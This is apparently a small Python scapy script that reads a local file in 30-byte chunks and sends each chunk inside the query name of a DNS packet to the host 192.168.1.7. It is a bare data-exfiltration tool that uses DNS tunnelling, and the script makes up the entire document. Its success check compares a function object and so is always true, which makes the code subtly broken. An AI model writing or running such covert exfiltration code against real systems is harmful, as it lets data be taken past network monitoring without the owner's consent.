#!/usr/bin/python3
 
import scapy.all
from scapy.layers.inet import ICMP as ICMP
from scapy.layers.inet import IP as IP
from scapy.layers.inet import UDP as UDP
from scapy.layers.dns import DNS as DNS
from scapy.layers.dns import DNSQR as DNSQR
 
cut_size = 30
send = scapy.sendrecv.sr1
file_path = ('/root/Documents/Python/scapy/asaf.txt')
with open (file_path, "rb") as rb:
    pkt = IP(dst='192.168.1.7')/ UDP()/ DNS(id=2, qd=DNSQR(qname=""))
    chunk = rb.read(cut_size)
    pkt[DNSQR].qname=chunk
    count = 1
    while (chunk):
        send(pkt)
        if (send) != True:
            print(f"Sending packet No. {count}. ")
            chunk = rb.read(cut_size)
            pkt[DNSQR].qname=chunk
        count+=1
print("Done!")